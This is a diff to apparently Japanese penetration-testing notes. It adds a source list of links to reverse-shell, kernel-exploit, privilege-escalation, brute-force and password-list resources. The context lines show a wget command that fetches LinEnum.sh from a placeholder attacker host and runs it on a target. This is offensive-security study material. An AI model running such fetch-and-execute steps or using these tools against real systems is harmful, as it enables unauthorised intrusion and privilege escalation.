@@ -437,3 +437,38 @@ wget [MyHostIP]:[MyHostPort]/LinEnum.sh
 chmod +x LinEnum.sh
 ./LinEnum.sh
 ----
+
+=== 情報元
+
+----
+# Docker
+https://hub.docker.com/u/kalilinux
+https://www.kali.org/docs/containers/official-kalilinux-docker-images/
+http://www.tohoho-web.com/docker/index.html
+https://qiita.com/wMETAw/items/34ba5c980e2a38e548db
+http://docs.docker.jp/index.html
+# SMB Attack
+https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
+https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+# Forensic tools
+https://qiita.com/knqyf263/items/6ebf06e27be7c48aab2e
+https://github.com/Va5c0/Steghide-Brute-Force-Tool
+# Directory Search
+https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/
+# Bruteforce Attack
+https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/
+https://ozuma.hatenablog.jp/entry/20130601/1370094859
+# Penetration
+https://github.com/pentestmonkey/php-reverse-shell
+# Privilege escalation
+https://github.com/lucyoa/kernel-exploits
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
+# Password lists
+https://wiki.skullsecurity.org/Passwords
+https://github.com/danielmiessler/SecLists/tree/master/Passwords
+# Asscidoctor
+https://github.com/asciidoctor/asciidoctor/blob/master/README-jp.adoc
+https://asciidoctor.org/docs/user-manual/
+https://asciidoctor.org/docs/asciidoc-recommended-practices/
+----
